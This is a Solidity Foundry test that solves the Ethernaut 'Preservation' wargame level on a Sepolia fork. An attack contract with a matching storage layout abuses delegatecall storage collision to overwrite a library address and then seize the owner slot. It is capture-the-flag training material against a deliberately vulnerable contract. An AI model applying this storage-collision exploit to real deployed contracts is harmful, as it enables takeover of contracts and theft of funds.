// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/16-Preservation/Preservation.sol";

contract ContractTest is Test {
    Preservation level16 =
        Preservation(payable(0xa808f0ca798Bd41c5985b887F407754a36cebB57));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0xa808f0ca798Bd41c5985b887F407754a36cebB57),
            "Ethernaut16"
        );
    }

    function testEthernaut16() public {
        // cast storage 0xa808f0ca798Bd41c5985b887F407754a36cebB57 0 --rpc-url https://rpc.ankr.com/eth_sepolia
        // 0x000000000000000000000000f88ed7d1dfcd1bb89a975662fd7cb536058f3a30
        //
        // cast storage 0xa808f0ca798Bd41c5985b887F407754a36cebB57 1 --rpc-url https://rpc.ankr.com/eth_sepolia
        // 0x0000000000000000000000007f08c632697adf1b5052d2eb82d3a272b0b92312

        AttackContract attacker = new AttackContract();
        attacker.trigger();

        // vm.load(address(level16), bytes32(uint256(2)));
        assert(level16.owner() == address(attacker));
    }

    receive() external payable {}
}

contract AttackContract {
    address public tz1_lib;
    address public tz2_lib;
    address public owner;

    Preservation level16 =
        Preservation(payable(0xa808f0ca798Bd41c5985b887F407754a36cebB57));

    function trigger() public {
        address addr = address(this);
        level16.setSecondTime(uint256(uint160(addr)));
        level16.setFirstTime(uint256(uint160(addr)));
    }

    function setTime(uint256 _timestamp) public {
        console.log("set owner as player");

        owner = address(uint160(_timestamp));
    }
}
